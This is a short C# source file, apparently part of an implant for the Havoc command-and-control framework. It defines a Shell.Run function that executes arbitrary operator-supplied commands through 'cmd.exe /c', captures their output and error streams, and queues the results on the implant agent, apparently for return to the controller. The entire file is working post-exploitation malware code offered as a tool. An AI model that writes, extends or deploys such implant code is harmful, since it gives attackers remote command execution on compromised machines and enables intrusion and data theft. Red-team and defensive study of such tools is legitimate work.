using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace HavocImplant.AgentFunctions
{
    public class Shell
    {
        public static void Run(Implant agent, string command)
        {

            string output = "";
            Console.WriteLine("Running cmd.exe /c " + command);
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + command;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.OutputDataReceived += (sender, args) => output += args.Data + Environment.NewLine;
            process.ErrorDataReceived += (sender, args) => output += args.Data + Environment.NewLine;
            process.Start();
            process.BeginErrorReadLine();
            process.BeginOutputReadLine();

            process.WaitForExit();
            agent.outputData += output.Replace("\\", "\\\\");
        }
    }
}
